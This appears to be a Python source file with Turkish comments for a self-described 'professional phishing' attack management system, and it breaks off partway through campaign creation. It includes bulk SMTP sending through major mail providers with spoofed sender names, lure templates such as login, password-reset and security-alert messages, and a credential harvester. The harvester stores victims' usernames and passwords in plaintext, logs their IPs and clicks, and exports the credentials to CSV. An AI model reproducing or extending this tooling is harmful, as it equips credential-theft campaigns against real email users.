# --- PROFESSIONAL PHISHING MODULE ---
# Gelişmiş Oltalama (Phishing) Saldırı Yönetim Sistemi
# Desteklenen Özellikler: SMTP Entegrasyonu, Şablon Yönetimi, Kimlik Bilgisi Yakalama, Canlı Raporlama

import datetime
import json
import uuid
import smtplib
import ssl
import threading
import time
import hashlib
import re
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.header import Header
from email.utils import make_msgid
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from abc import ABC, abstractmethod

from cyberapp.models.db import db_conn

# --- SABİTLER VE YAPILANDIRMA ---
PHISHING_DB_PATH = "/tmp/phishing_credentials.db"
EMAIL_QUEUE_PATH = "/tmp/email_queue.json"
TEMPLATE_PATH = "/tmp/phishing_templates"
TEMP_ATTACHMENTS_PATH = "/tmp/phishing_attachments"

# Varsayılan e-posta sağlayıcı yapılandırmaları
DEFAULT_SMTP_PROVIDERS = {
    "gmail": {
        "host": "smtp.gmail.com",
        "port": 587,
        "ssl_port": 465,
        "tls": True,
        "max_emails_per_hour": 500
    },
    "outlook": {
        "host": "smtp-mail.outlook.com",
        "port": 587,
        "ssl_port": 465,
        "tls": True,
        "max_emails_per_hour": 300
    },
    "office365": {
        "host": "smtp.office365.com",
        "port": 587,
        "ssl_port": 465,
        "tls": True,
        "max_emails_per_hour": 1000
    },
    "yahoo": {
        "host": "smtp.mail.yahoo.com",
        "port": 587,
        "ssl_port": 465,
        "tls": True,
        "max_emails_per_hour": 200
    }
}


# --- VERİ SINIFLARI ---
class CampaignStatus(Enum):
    """Kampanya durumu enum sınıfı."""
    DRAFT = "draft"
    SCHEDULED = "scheduled"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    CANCELLED = "cancelled"


class EmailStatus(Enum):
    """E-posta gönderim durumu enum sınıfı."""
    PENDING = "pending"
    SENDING = "sending"
    DELIVERED = "delivered"
    OPENED = "opened"
    CLICKED = "clicked"
    BOUNCED = "bounced"
    FAILED = "failed"


class TemplateType(Enum):
    """Şablon türü enum sınıfı."""
    LOGIN = "login"
    PASSWORD_RESET = "password_reset"
    ACCOUNT_VERIFICATION = "account_verification"
    SECURITY_ALERT = "security_alert"
    DOCUMENT_SHARE = "document_share"
    INVOICE = "invoice"
    CUSTOM = "custom"


@dataclass
class Target:
    """Hedef kişi veri sınıfı."""
    email: str
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    company: Optional[str] = None
    position: Optional[str] = None
    custom_fields: Dict[str, str] = field(default_factory=dict)
    tags: List[str] = field(default_factory=list)
    
    def get_display_name(self) -> str:
        """Görüntülenme adını döndürür."""
        if self.first_name and self.last_name:
            return f"{self.first_name} {self.last_name}"
        elif self.first_name:
            return self.first_name
        return self.email.split('@')[0]
    
    def to_dict(self) -> Dict:
        """Sözlük formatına dönüştürür."""
        return {
            "email": self.email,
            "first_name": self.first_name,
            "last_name": self.last_name,
            "company": self.company,
            "position": self.position,
            "custom_fields": self.custom_fields,
            "tags": self.tags
        }


@dataclass
class EmailTemplate:
    """E-posta şablonu veri sınıfı."""
    template_id: str
    name: str
    template_type: TemplateType
    subject: str
    html_content: str
    text_content: Optional[str] = None
    from_name: Optional[str] = None
    from_email: Optional[str] = None
    reply_to: Optional[str] = None
    variables: List[str] = field(default_factory=list)
    attachments: List[str] = field(default_factory=list)
    created_at: datetime.datetime = field(default_factory=datetime.datetime.now)
    updated_at: datetime.datetime = field(default_factory=datetime.datetime.now)
    version: int = 1
    is_active: bool = True
    
    def render(self, variables: Dict[str, str]) -> Tuple[str, str, Dict[str, str]]:
        """Şablonu belirtilen değişkenlerle işler."""
        rendered_subject = self.subject
        rendered_html = self.html_content
        rendered_text = self.text_content or ""
        
        replaced_vars = {}
        
        for var in self.variables:
            if var in variables:
                value = variables[var]
                placeholder = f"{{{{{var}}}}}"
                rendered_subject = rendered_subject.replace(placeholder, str(value))
                rendered_html = rendered_html.replace(placeholder, str(value))
                if rendered_text:
                    rendered_text = rendered_text.replace(placeholder, str(value))
                replaced_vars[var] = value
            else:
                placeholder = f"{{{{{var}}}}}"
                rendered_subject = rendered_subject.replace(placeholder, f"[{var}]")
                rendered_html = rendered_html.replace(placeholder, f"[{var}]")
                if rendered_text:
                    rendered_text = rendered_text.replace(placeholder, f"[{var}]")
        
        return rendered_subject, rendered_html, rendered_text


@dataclass
class EmailMessage:
    """E-posta mesajı veri sınıfı."""
    message_id: str
    campaign_id: str
    template_id: str
    to_email: str
    to_name: str
    from_email: str
    from_name: str
    subject: str
    html_content: str
    text_content: Optional[str] = None
    variables: Dict[str, str] = field(default_factory=dict)
    status: EmailStatus = EmailStatus.PENDING
    sent_at: Optional[datetime.datetime] = None
    opened_at: Optional[datetime.datetime] = None
    clicked_at: Optional[datetime.datetime] = None
    bounce_reason: Optional[str] = None
    retry_count: int = 0
    max_retries: int = 3
    
    def to_dict(self) -> Dict:
        """Sözlük formatına dönüştürür."""
        return {
            "message_id": self.message_id,
            "campaign_id": self.campaign_id,
            "template_id": self.template_id,
            "to_email": self.to_email,
            "to_name": self.to_name,
            "from_email": self.from_email,
            "from_name": self.from_name,
            "subject": self.subject,
            "status": self.status.value,
            "sent_at": self.sent_at.isoformat() if self.sent_at else None,
            "opened_at": self.opened_at.isoformat() if self.opened_at else None,
            "clicked_at": self.clicked_at.isoformat() if self.clicked_at else None,
            "retry_count": self.retry_count
        }


@dataclass
class Campaign:
    """Kampanya veri sınıfı."""
    campaign_id: str
    name: str
    description: str = ""
    template_id: Optional[str] = None
    status: CampaignStatus = CampaignStatus.DRAFT
    from_email: Optional[str] = None
    from_name: Optional[str] = None
    reply_to: Optional[str] = None
    targets: List[Target] = field(default_factory=list)
    target_groups: List[str] = field(default_factory=list)
    smtp_config: Dict[str, Any] = field(default_factory=dict)
    schedule_start: Optional[datetime.datetime] = None
    schedule_end: Optional[datetime.datetime] = None
    send_rate: int = 10
    max_emails: Optional[int] = None
    created_at: datetime.datetime = field(default_factory=datetime.datetime.now)
    updated_at: datetime.datetime = field(default_factory=datetime.datetime.now)
    completed_at: Optional[datetime.datetime] = None
    stats: Dict[str, int] = field(default_factory=lambda: {
        "total": 0,
        "sent": 0,
        "delivered": 0,
        "opened": 0,
        "clicked": 0,
        "bounced": 0,
        "failed": 0
    })
    tags: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        """Sözlük formatına dönüştürür."""
        return {
            "campaign_id": self.campaign_id,
            "name": self.name,
            "description": self.description,
            "template_id": self.template_id,
            "status": self.status.value,
            "from_email": self.from_email,
            "from_name": self.from_name,
            "target_count": len(self.targets),
            "stats": self.stats,
            "created_at": self.created_at.isoformat(),
            "updated_at": self.updated_at.isoformat()
        }


# --- SMTP MOTORU ---
class SMTPEngine:
    """
    Gelişmiş SMTP Motoru
    E-posta gönderimi için kapsamlı SMTP desteği sağlar.
    """
    
    def __init__(self):
        self.active_connections: Dict[str, smtplib.SMTP] = {}
        self.connection_pool: List[Tuple[str, smtplib.SMTP]] = []
        self.lock = threading.Lock()
        self.sent_count = 0
        self.error_count = 0
        
    def create_connection(self, host: str, port: int, username: str, password: str,
                         use_tls: bool = True, timeout: int = 30) -> Optional[smtplib.SMTP]:
        """SMTP bağlantısı oluşturur."""
        try:
            if use_tls:
                context = ssl.create_default_context()
                server = smtplib.SMTP(host, port, timeout=timeout)
                server.ehlo()
                server.starttls(context=context)
            else:
                server = smtplib.SMTP(host, port, timeout=timeout)
                server.ehlo()
            
            server.login(username, password)
            return server
            
        except Exception as e:
            print(f"[!] SMTP bağlantı hatası: {e}")
            return None
    
    def send_email(self, server: smtplib.SMTP, from_addr: str, to_addr: str,
                   subject: str, html_content: str, text_content: str,
                   from_name: Optional[str] = None, reply_to: Optional[str] = None) -> bool:
        """
        Tek bir e-posta gönderir.
        
        Args:
            server: SMTP sunucu nesnesi
            from_addr: Gönderen e-posta adresi
            to_addr: Alıcı e-posta adresi
            subject: E-posta konusu
            html_content: HTML içerik
            text_content: Düz metin içerik
            from_name: Görüntülenen gönderen adı
            reply_to: Yanıt adresi
            
        Returns:
            bool: Gönderim başarılı ise True
        """
        try:
            msg = MIMEMultipart('alternative')
            msg['Subject'] = Header(subject, 'utf-8')
            msg['From'] = f"{from_name} <{from_addr}>" if from_name else from_addr
            msg['To'] = to_addr
            
            if reply_to:
                msg['Reply-To'] = reply_to
            
            msg['Message-ID'] = f"<{uuid.uuid4().hex}@{from_addr.split('@')[1]}>"
            msg['Date'] = datetime.datetime.now().strftime('%a, %d %b %Y %H:%M:%S +0000')
            
            part1 = MIMEText(text_content, 'plain', 'utf-8')
            part2 = MIMEText(html_content, 'html', 'utf-8')
            
            msg.attach(part1)
            msg.attach(part2)
            
            server.sendmail(from_addr, [to_addr], msg.as_string())
            
            with self.lock:
                self.sent_count += 1
            
            return True
            
        except Exception as e:
            print(f"[!] E-posta gönderim hatası: {e}")
            with self.lock:
                self.error_count += 1
            return False
    
    def send_bulk_emails(self, smtp_config: Dict, messages: List[EmailMessage],
                         send_rate: int = 10, progress_callback: Optional[Callable] = None) -> Dict:
        """
        Toplu e-posta gönderimi yapar.
        
        Args:
            smtp_config: SMTP yapılandırması
            messages: Gönderilecek mesaj listesi
            send_rate: Saniyede gönderim sayısı
            progress_callback: İlerleme geri çağırma fonksiyonu
            
        Returns:
            Dict: Gönderim sonuçları
        """
        results = {"success": 0, "failed": 0, "details": []}
        
        host = smtp_config.get("host", "smtp.gmail.com")
        port = smtp_config.get("port", 587)
        username = smtp_config.get("username")
        password = smtp_config.get("password")
        use_tls = smtp_config.get("tls", True)
        
        if not username or not password:
            print("[!] SMTP kimlik bilgileri eksik!")
            return results
        
        server = self.create_connection(host, port, username, password, use_tls)
        
        if not server:
            print("[!] SMTP sunucusuna bağlanılamadı!")
            return results
        
        try:
            for i, message in enumerate(messages):
                success = self.send_email(
                    server=server,
                    from_addr=message.from_email,
                    to_addr=message.to_email,
                    subject=message.subject,
                    html_content=message.html_content,
                    text_content=message.text_content or "",
                    from_name=message.from_name,
                    reply_to=smtp_config.get("reply_to")
                )
                
                if success:
                    results["success"] += 1
                    message.status = EmailStatus.DELIVERED
                    message.sent_at = datetime.datetime.now()
                else:
                    results["failed"] += 1
                    message.status = EmailStatus.FAILED
                    message.retry_count += 1
                
                results["details"].append(message.to_dict())
                
                if progress_callback:
                    progress_callback(i + 1, len(messages), success)
                
                if (i + 1) % send_rate == 0:
                    time.sleep(1)
                    
        finally:
            try:
                server.quit()
            except:
                pass
        
        return results
    
    def get_provider_config(self, provider_name: str) -> Optional[Dict]:
        """Sağlayıcı yapılandırmasını döndürür."""
        return DEFAULT_SMTP_PROVIDERS.get(provider_name.lower())
    
    def validate_smtp_config(self, config: Dict) -> Tuple[bool, str]:
        """SMTP yapılandırmasını doğrular."""
        required_fields = ["host", "port", "username", "password"]
        
        for field in required_fields:
            if field not in config or not config[field]:
                return False, f"{field} alanı zorunludur"
        
        if config["port"] not in [25, 465, 587, 2525]:
            return False, "Geçersiz SMTP port numarası"
        
        return True, "Yapılandırma geçerli"


# --- ŞABLON YÖNETİCİSİ ---
class TemplateManager:
    """
    Phishing Şablon Yöneticisi
    Oltalama şablonlarının oluşturulması, düzenlenmesi ve yönetilmesi için kapsamlı sistem.
    """
    
    def __init__(self, template_path: str = TEMPLATE_PATH):
        self.template_path = template_path
        self.templates: Dict[str, EmailTemplate] = {}
        self.template_lock = threading.Lock()
        
        os.makedirs(template_path, exist_ok=True)
        self._load_templates()
    
    def _generate_template_id(self) -> str:
        """Benzersiz şablon ID'si oluşturur."""
        return f"tpl_{uuid.uuid4().hex[:12]}"
    
    def extract_variables(self, content: str) -> List[str]:
        """İçerikteki değişkenleri tespit eder."""
        pattern = r'\{\{([a-zA-Z_][a-zA-Z0-9_]*)\}\}'
        matches = re.findall(pattern, content)
        return list(set(matches))
    
    def create_template(self, name: str, template_type: TemplateType, subject: str,
                       html_content: str, text_content: Optional[str] = None,
                       from_name: Optional[str] = None, from_email: Optional[str] = None) -> EmailTemplate:
        """
        Yeni phishing şablonu oluşturur.
        
        Args:
            name: Şablon adı
            template_type: Şablon türü
            subject: E-posta konusu
            html_content: HTML içerik
            text_content: Düz metin içerik
            from_name: Gönderen adı
            from_email: Gönderen e-posta
            
        Returns:
            EmailTemplate: Oluşturulan şablon
        """
        variables = self.extract_variables(html_content)
        if subject:
            variables.extend(self.extract_variables(subject))
        
        template = EmailTemplate(
            template_id=self._generate_template_id(),
            name=name,
            template_type=template_type,
            subject=subject,
            html_content=html_content,
            text_content=text_content,
            from_name=from_name,
            from_email=from_email,
            variables=list(set(variables))
        )
        
        with self.template_lock:
            self.templates[template.template_id] = template
            self._save_template(template)
        
        return template
    
    def update_template(self, template_id: str, **kwargs) -> Optional[EmailTemplate]:
        """Mevcut şablonu günceller."""
        with self.template_lock:
            if template_id not in self.templates:
                return None
            
            template = self.templates[template_id]
            
            for key, value in kwargs.items():
                if hasattr(template, key):
                    setattr(template, key, value)
            
            template.updated_at = datetime.datetime.now()
            template.version += 1
            
            if "html_content" in kwargs or "subject" in kwargs:
                template.variables = self.extract_variables(template.html_content)
                if template.subject:
                    template.variables.extend(self.extract_variables(template.subject))
                template.variables = list(set(template.variables))
            
            self._save_template(template)
            return template
    
    def get_template(self, template_id: str) -> Optional[EmailTemplate]:
        """Şablonu ID ile getirir."""
        with self.template_lock:
            return self.templates.get(template_id)
    
    def delete_template(self, template_id: str) -> bool:
        """Şablonu siler."""
        with self.template_lock:
            if template_id not in self.templates:
                return False
            
            template = self.templates.pop(template_id)
            template_path = os.path.join(self.template_path, f"{template_id}.json")
            
            if os.path.exists(template_path):
                os.remove(template_path)
            
            return True
    
    def list_templates(self, template_type: Optional[TemplateType] = None,
                       active_only: bool = True) -> List[EmailTemplate]:
        """Şablonları listeler."""
        with self.template_lock:
            templates = list(self.templates.values())
            
            if template_type:
                templates = [t for t in templates if t.template_type == template_type]
            
            if active_only:
                templates = [t for t in templates if t.is_active]
            
            return sorted(templates, key=lambda x: x.created_at, reverse=True)
    
    def _save_template(self, template: EmailTemplate):
        """Şablonu dosyaya kaydeder."""
        template_data = {
            "template_id": template.template_id,
            "name": template.name,
            "template_type": template.template_type.value,
            "subject": template.subject,
            "html_content": template.html_content,
            "text_content": template.text_content,
            "from_name": template.from_name,
            "from_email": template.from_email,
            "reply_to": template.reply_to,
            "variables": template.variables,
            "attachments": template.attachments,
            "created_at": template.created_at.isoformat(),
            "updated_at": template.updated_at.isoformat(),
            "version": template.version,
            "is_active": template.is_active
        }
        
        template_path = os.path.join(self.template_path, f"{template.template_id}.json")
        with open(template_path, 'w', encoding='utf-8') as f:
            json.dump(template_data, f, indent=2, ensure_ascii=False)
    
    def _load_templates(self):
        """Şablonları dosyadan yükler."""
        if not os.path.exists(self.template_path):
            return
        
        for filename in os.listdir(self.template_path):
            if filename.endswith('.json'):
                try:
                    template_path = os.path.join(self.template_path, filename)
                    with open(template_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    
                    template = EmailTemplate(
                        template_id=data["template_id"],
                        name=data["name"],
                        template_type=TemplateType(data["template_type"]),
                        subject=data["subject"],
                        html_content=data["html_content"],
                        text_content=data.get("text_content"),
                        from_name=data.get("from_name"),
                        from_email=data.get("from_email"),
                        reply_to=data.get("reply_to"),
                        variables=data.get("variables", []),
                        attachments=data.get("attachments", []),
                        created_at=datetime.datetime.fromisoformat(data["created_at"]),
                        updated_at=datetime.datetime.fromisoformat(data["updated_at"]),
                        version=data.get("version", 1),
                        is_active=data.get("is_active", True)
                    )
                    
                    self.templates[template.template_id] = template
                    
                except Exception as e:
                    print(f"[!] Şablon yükleme hatası {filename}: {e}")
    
    def clone_template(self, template_id: str, new_name: str) -> Optional[EmailTemplate]:
        """Mevcut şablonu kopyalar."""
        with self.template_lock:
            original = self.templates.get(template_id)
            if not original:
                return None
            
            return self.create_template(
                name=new_name,
                template_type=original.template_type,
                subject=original.subject,
                html_content=original.html_content,
                text_content=original.text_content,
                from_name=original.from_name,
                from_email=original.from_email
            )
    
    def render_template(self, template_id: str, variables: Dict[str, str]) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """Şablonu değişkenlerle işler."""
        template = self.get_template(template_id)
        if not template:
            return None, None, None
        
        return template.render(variables)
    
    def get_preview_data(self, template_id: str) -> Dict:
        """Şablon önizleme verilerini döndürür."""
        template = self.get_template(template_id)
        if not template:
            return {}
        
        preview_vars = {
            "first_name": "John",
            "last_name": "Doe",
            "email": "john.doe@example.com",
            "company": "Example Corp",
            "position": "Software Engineer"
        }
        
        subject, html, text = template.render(preview_vars)
        
        return {
            "template_id": template.template_id,
            "name": template.name,
            "template_type": template.template_type.value,
            "subject": subject,
            "html_content": html,
            "text_content": text,
            "variables": template.variables,
            "preview_variables": preview_vars
        }


# --- KİMLİK BİLGİSİ YAKALAYICI ---
class CredentialHarvester:
    """
    Gelişmiş Kimlik Bilgisi Yakalayıcı
    Phishing sayfalarından elde edilen kimlik bilgilerini işler ve depolar.
    """
    
    def __init__(self, db_path: str = PHISHING_DB_PATH):
        self.db_path = db_path
        self.setup_database()
        self.lock = threading.Lock()
    
    def setup_database(self):
        """Veritabanı şemasını oluşturur."""
        with db_conn(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT NOT NULL,
                    message_id TEXT,
                    username TEXT,
                    password TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    referer TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                    status TEXT DEFAULT 'NEW',
                    raw_data TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE NOT NULL,
                    campaign_id TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                    last_activity TEXT DEFAULT CURRENT_TIMESTAMP,
                    steps_completed INTEGER DEFAULT 0,
                    total_steps INTEGER DEFAULT 1,
                    is_complete INTEGER DEFAULT 0
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS clicks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT NOT NULL,
                    message_id TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                    event_type TEXT DEFAULT 'click',
                    target_url TEXT,
                    raw_data TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS opens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT NOT NULL,
                    message_id TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                    raw_headers TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS forms (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT NOT NULL,
                    form_name TEXT,
                    field_name TEXT,
                    field_type TEXT,
                    is_sensitive INTEGER DEFAULT 0
                )
            """)
            
            conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_cred_campaign ON credentials(campaign_id)
            """)
            conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_sess_campaign ON sessions(campaign_id)
            """)
            conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_clicks_campaign ON clicks(campaign_id)
            """)
    
    def log_credential(self, campaign_id: str, username: str, password: str,
                      ip_address: str, user_agent: str, message_id: Optional[str] = None,
                      referer: Optional[str] = None, raw_data: Optional[str] = None) -> int:
        """Kimlik bilgisi kaydeder."""
        with self.lock:
            with db_conn(self.db_path) as conn:
                cursor = conn.execute("""
                    INSERT INTO credentials (
                        campaign_id, message_id, username, password,
                        ip_address, user_agent, referer, raw_data
                    )
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    campaign_id, message_id, username, password,
                    ip_address, user_agent, referer, raw_data
                ))
                conn.commit()
                return cursor.lastrowid
    
    def create_session(self, campaign_id: str, ip_address: str,
                      user_agent: str, total_steps: int = 1) -> str:
        """Yeni oturum oluşturur."""
        session_id = f"sess_{uuid.uuid4().hex[:16]}"
        
        with db_conn(self.db_path) as conn:
            conn.execute("""
                INSERT INTO sessions (
                    session_id, campaign_id, ip_address, user_agent, total_steps
                )
                VALUES (?, ?, ?, ?, ?)
            """, (session_id, campaign_id, ip_address, user_agent, total_steps))
            conn.commit()
        
        return session_id
    
    def update_session(self, session_id: str, step: int = 1) -> bool:
        """Oturumu günceller."""
        try:
            with db_conn(self.db_path) as conn:
                conn.execute("""
                    UPDATE sessions
                    SET steps_completed = ?,
                        last_activity = CURRENT_TIMESTAMP,
                        is_complete = CASE
                            WHEN ? >= total_steps THEN 1
                            ELSE 0
                        END
                    WHERE session_id = ?
                """, (step, step, session_id))
                conn.commit()
            return True
        except Exception as e:
            print(f"[!] Oturum güncelleme hatası: {e}")
            return False
    
    def log_click(self, campaign_id: str, ip_address: str, user_agent: str,
                 message_id: Optional[str] = None, target_url: Optional[str] = None,
                 event_type: str = "click", raw_data: Optional[str] = None) -> int:
        """Tıklama olayı kaydeder."""
        with self.lock:
            with db_conn(self.db_path) as conn:
                cursor = conn.execute("""
                    INSERT INTO clicks (
                        campaign_id, message_id, ip_address, user_agent,
                        target_url, event_type, raw_data
                    )
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (
                    campaign_id, message_id, ip_address, user_agent,
                    target_url, event_type, raw_data
                ))
                conn.commit()
                return cursor.lastrowid
    
    def log_open(self, campaign_id: str, message_id: str, ip_address: str,
                user_agent: str, raw_headers: Optional[str] = None) -> int:
        """E-posta açılma olayı kaydeder."""
        with self.lock:
            with db_conn(self.db_path) as conn:
                cursor = conn.execute("""
                    INSERT INTO opens (
                        campaign_id, message_id, ip_address, user_agent, raw_headers
                    )
                    VALUES (?, ?, ?, ?, ?)
                """, (campaign_id, message_id, ip_address, user_agent, raw_headers))
                conn.commit()
                return cursor.lastrowid
    
    def get_credentials(self, campaign_id: Optional[str] = None,
                       status: Optional[str] = None, limit: int = 100) -> List[Dict]:
        """Kimlik bilgilerini getirir."""
        query = "SELECT * FROM credentials WHERE 1=1"
        params = []
        
        if campaign_id:
            query += " AND campaign_id = ?"
            params.append(campaign_id)
        
        if status:
            query += " AND status = ?"
            params.append(status)
        
        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)
        
        with db_conn(self.db_path) as conn:
            rows = conn.execute(query, params).fetchall()
            
            return [
                {
                    "id": row[0],
                    "campaign_id": row[1],
                    "message_id": row[2],
                    "username": row[3],
                    "password": row[4],
                    "ip_address": row[5],
                    "user_agent": row[6],
                    "timestamp": row[8],
                    "status": row[9]
                }
                for row in rows
            ]
    
    def get_sessions(self, campaign_id: Optional[str] = None,
                    completed: Optional[bool] = None) -> List[Dict]:
        """Oturumları getirir."""
        query = "SELECT * FROM sessions WHERE 1=1"
        params = []
        
        if campaign_id:
            query += " AND campaign_id = ?"
            params.append(campaign_id)
        
        if completed is not None:
            query += " AND is_complete = ?"
            params.append(1 if completed else 0)
        
        with db_conn(self.db_path) as conn:
            rows = conn.execute(query, params).fetchall()
            
            return [
                {
                    "session_id": row[1],
                    "campaign_id": row[2],
                    "ip_address": row[3],
                    "created_at": row[6],
                    "last_activity": row[7],
                    "progress": f"{row[8]}/{row[9]}"
                }
                for row in rows
            ]
    
    def get_analytics(self, campaign_id: Optional[str] = None) -> Dict:
        """Analitik verilerini döndürür."""
        stats = {}
        
        with db_conn(self.db_path) as conn:
            if campaign_id:
                stats["total_credentials"] = conn.execute(
                    "SELECT COUNT(*) FROM credentials WHERE campaign_id = ?", (campaign_id,)
                ).fetchone()[0]
                
                stats["total_sessions"] = conn.execute(
                    "SELECT COUNT(*) FROM sessions WHERE campaign_id = ?", (campaign_id,)
                ).fetchone()[0]
                
                stats["completed_sessions"] = conn.execute(
                    "SELECT COUNT(*) FROM sessions WHERE campaign_id = ? AND is_complete = 1", (campaign_id,)
                ).fetchone()[0]
                
                stats["total_clicks"] = conn.execute(
                    "SELECT COUNT(*) FROM clicks WHERE campaign_id = ?", (campaign_id,)
                ).fetchone()[0]
                
                stats["unique_opens"] = conn.execute(
                    "SELECT COUNT(DISTINCT message_id) FROM opens WHERE campaign_id = ?", (campaign_id,)
                ).fetchone()[0]
                
                stats["conversion_rate"] = round(
                    (stats["total_credentials"] / stats["total_sessions"] * 100), 2
                ) if stats["total_sessions"] > 0 else 0
                
                stats["completion_rate"] = round(
                    (stats["completed_sessions"] / stats["total_sessions"] * 100), 2
                ) if stats["total_sessions"] > 0 else 0
                
                top_ips = conn.execute("""
                    SELECT ip_address, COUNT(*) as count
                    FROM credentials
                    WHERE campaign_id = ?
                    GROUP BY ip_address
                    ORDER BY count DESC
                    LIMIT 5
                """, (campaign_id,)).fetchall()
                stats["top_ips"] = [{"ip": row[0], "count": row[1]} for row in top_ips]
                
            else:
                stats["total_credentials"] = conn.execute(
                    "SELECT COUNT(*) FROM credentials"
                ).fetchone()[0]
                
                stats["total_sessions"] = conn.execute(
                    "SELECT COUNT(*) FROM sessions"
                ).fetchone()[0]
                
                stats["total_clicks"] = conn.execute(
                    "SELECT COUNT(*) FROM clicks"
                ).fetchone()[0]
        
        return stats
    
    def export_credentials(self, campaign_id: str, format: str = "csv") -> str:
        """Kimlik bilgilerini dışa aktarır."""
        credentials = self.get_credentials(campaign_id, limit=10000)
        
        if format == "csv":
            lines = ["id,campaign_id,username,password,ip_address,timestamp"]
            for cred in credentials:
                lines.append(
                    f"{cred['id']},{cred['campaign_id']},"
                    f"{cred['username']},{cred['password']},"
                    f"{cred['ip_address']},{cred['timestamp']}"
                )
            return "\n".join(lines)
        
        elif format == "json":
            return json.dumps(credentials, indent=2)
        
        return ""
    
    def clear_credentials(self, campaign_id: Optional[str] = None) -> bool:
        """Kimlik bilgilerini temizler."""
        try:
            with db_conn(self.db_path) as conn:
                if campaign_id:
                    conn.execute("DELETE FROM credentials WHERE campaign_id = ?", (campaign_id,))
                    conn.execute("DELETE FROM sessions WHERE campaign_id = ?", (campaign_id,))
                    conn.execute("DELETE FROM clicks WHERE campaign_id = ?", (campaign_id,))
                    conn.execute("DELETE FROM opens WHERE campaign_id = ?", (campaign_id,))
                else:
                    conn.execute("DELETE FROM credentials")
                    conn.execute("DELETE FROM sessions")
                    conn.execute("DELETE FROM clicks")
                    conn.execute("DELETE FROM opens")
                conn.commit()
            return True
        except Exception as e:
            print(f"[!] Temizleme hatası: {e}")
            return False


# --- KAMPANYA YÖNETİCİSİ ---
class CampaignManager:
    """
    Phishing Kampanya Yöneticisi
    Kampanyaların oluşturulması, yönetilmesi ve izlenmesi için kapsamlı sistem.
    """
    
    def __init__(self, db_path: str = PHISHING_DB_PATH):
        self.db_path = db_path
        self.campaigns: Dict[str, Campaign] = {}
        self.smtp_engine = SMTPEngine()
        self.template_manager = TemplateManager()
        self.harvester = CredentialHarvester(db_path)
        self.lock = threading.Lock()
        
        self.setup_database()
        self._load_campaigns()
    
    def setup_database(self):
        """Veritabanı şemasını oluşturur."""
        with db_conn(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS campaigns (
                    campaign_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    description TEXT,
                    template_id TEXT,
                    status TEXT DEFAULT 'draft',
                    from_email TEXT,
                    from_name TEXT,
                    reply_to TEXT,
                    smtp_config TEXT,
                    schedule_start TEXT,
                    schedule_end TEXT,
                    send_rate INTEGER DEFAULT 10,
                    max_emails INTEGER,
                    stats TEXT,
                    tags TEXT,
                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS campaign_targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT NOT NULL,
                    email TEXT NOT NULL,
                    first_name TEXT,
                    last_name TEXT,
                    company TEXT,
                    position TEXT,
                    custom_fields TEXT,
                    tags TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS email_queue (
                    queue_id TEXT PRIMARY KEY,
                    campaign_id TEXT NOT NULL,
                    message_id TEXT NOT NULL,
                    status TEXT DEFAULT 'pending',
                    priority INTEGER DEFAULT 5,
                    scheduled_at TEXT,
                    attempts INTEGER DEFAULT 0,
                    last_attempt TEXT
                )
            """)
    
    def _generate_campaign_id(self) -> str:
        """Benzersiz kampanya ID'si oluşturur."""
        return f"camp_{uuid.uuid4().hex[:12]}"
    
    def create_campaign(self, name: str, description: str = "",
                       template_id: Optional[str] = None,
                       from_email: Optional[str] = None,
                       from_name: Optional[str] = None,
                       reply_to: Optional[str] = None,
                       smtp_config: Optional[Dict] = None,
                       send_rate: int = 10,
                       max_emails: Optional[int] = None,
                       tags: Optional[List[str]] = None) -> Campaign:
        """
        Yeni phishing kampanyası oluşturur.
        
        Args:
            name: Kampanya adı
            description: Açıklama
            template_id: Kullanılacak şablon ID
            from_email: Gönderen e-posta
            from_name: Görüntülenen gönderen adı
            reply_to: Yanıt adresi
            smtp_config: SMTP yapılandırması
            send_rate: Saniyede gönderim sayısı
            max_emails: Maksimum e-posta sayısı
            tags: Etiketler
            
        Returns:
            Campaign: Oluşturulan kampanya
        """
        campaign = Campaign(
            campaign_id=self._generate_campaign_id(),
            name=name,
            description=description,
            template_id=template_id,
